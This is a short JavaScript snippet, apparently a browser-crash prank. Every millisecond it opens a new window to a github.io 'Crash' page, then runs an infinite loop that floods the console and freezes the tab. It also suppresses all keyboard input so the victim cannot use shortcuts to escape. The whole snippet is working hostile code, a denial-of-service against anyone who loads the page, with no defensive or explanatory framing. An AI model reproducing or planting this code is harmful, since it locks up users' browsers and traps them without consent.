setInterval(function() {
    window.open('https://kufbsrieewz.github.io/Crash/crash.html')
    for (let i = 0; i < 1; i--) {
        console.log(Math.random() * i)
    }
}, 1)
window.onkeydown = function(event) {
    event.preventDefault()
}
